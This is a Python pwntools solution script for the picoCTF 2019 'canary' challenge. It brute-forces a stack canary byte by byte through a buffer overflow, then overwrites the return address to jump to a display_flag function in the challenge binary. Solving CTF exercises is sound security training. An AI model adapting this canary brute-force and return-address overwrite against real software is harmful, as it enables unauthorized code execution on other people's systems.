#!/usr/bin/env python2

'''
picoCTF '19

Challenge: canary
Category:  Binary Exploitation
Points:    300
'''

import pwn

KEY_LEN  = 4
BUF_SIZE = 32
ELF      = pwn.ELF('/problems/canary_1_a5eaebeeb66458dec31e09fa8fc517fd/vuln')

# (1) bruteforce the canary

progress = pwn.log.progress('Bruteforcing canary')
CANARY = ''

for i in xrange(1, 5):
    for b in xrange(256):
        # Display current progress
        progress.status(CANARY.encode('hex') + chr(b))

        # Send the current guess to the program
        p = ELF.process(level='CRITICAL')
        p.sendlineafter('>', str(BUF_SIZE + i))
        p.sendlineafter('Input> ', 'A' * BUF_SIZE + CANARY + chr(b))
        result = p.recvline()
        p.close()

        # Check if the guess is correct
        if 'Ok... Now Where\'s the Flag?' in result:
            CANARY += chr(b)
            break

    else:
        progress.failure('runout of guesses')

else:
    progress.success(CANARY.encode('hex'))

    # (2) bruteforce the return address
    progress = pwn.log.progress('Bruteforcing display_flag address')

    while True:
        p = ELF.process(level='CRITICAL')
        p.sendlineafter('>', str(0x36))
        p.sendlineafter('Input> ', 'A' * BUF_SIZE + CANARY + 'A' * (0x10) + pwn.p32(ELF.sym['display_flag']))
        result = p.recvall()

        if 'picoCTF' in result:
            progress.success(result[result.index('picoCTF'):].strip())
            break
